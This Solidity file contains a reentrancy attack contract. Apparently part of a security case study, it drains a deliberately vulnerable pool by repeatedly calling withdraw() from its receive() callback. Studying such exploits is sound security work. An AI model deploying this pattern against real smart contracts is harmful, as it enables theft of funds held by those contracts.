// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VulnerablePool} from "./VulnerablePool.sol";

/// @title AttackerContract
/// @notice Exploits the reentrancy bug in VulnerablePool by recursively calling
///         withdraw() from within the receive() callback.
/// @dev Part of the mandatory security case study (§2.6).
contract AttackerContract {
    VulnerablePool public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = VulnerablePool(payable(_target));
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            attackCount++;
            target.withdraw();
        }
    }
}
